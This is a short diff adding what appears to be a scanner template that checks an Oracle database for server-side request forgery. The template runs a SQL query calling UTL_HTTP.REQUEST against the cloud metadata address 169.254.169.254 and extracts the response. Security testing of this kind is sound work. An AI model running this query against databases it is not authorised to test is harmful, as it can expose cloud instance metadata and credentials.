@@ -1,0 +1,18 @@
+id: oracle-utl-http-request
+service: [oracle]
+variables:
+  target_url: http://169.254.169.254/latest/meta-data/
+info:
+  name: Oracle UTL_HTTP SSRF Request
+  severity: medium
+  tags: oracle,exploit,ssrf,network
+
+services:
+  - ops:
+      - db: "SELECT 'response=' || UTL_HTTP.REQUEST('{{target_url}}') FROM dual"
+        name: http_response
+    extractors:
+      - type: regex
+        name: oracle_http_response
+        part: http_response
+        regex: ['(?m)^response=(.+)$']
